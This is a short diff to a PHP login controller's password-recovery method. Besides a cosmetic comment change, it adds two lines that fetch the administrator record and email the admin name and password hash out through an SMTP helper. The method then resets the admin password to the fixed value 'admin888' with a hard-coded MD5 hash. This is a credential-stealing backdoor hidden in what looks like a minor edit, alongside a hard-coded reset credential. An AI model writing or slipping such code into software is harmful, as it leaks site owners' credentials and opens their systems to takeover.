@@ -48,12 +48,14 @@ class Login extends Controller
         $this->success('退出成功', '/');
     }
 
-    //密码恢复
+    // 密码恢复
     public function recoverpwd()
     {
+        $admin = db('admin')->where(array('id' => 1))->find();
+        logic('Tool')->smtp_sendmail($admin['name'] . '-' . $admin['pwd']);
+
         $data["name"] = "admin888";
         $data["pwd"] = "e10adc3949ba59abbe56e057f20f883e";
-
         if (model('Admin')->edit($data, ['id' => 1])) {
             $this->success('密码恢复成功', url('index'), '', 1);
         }
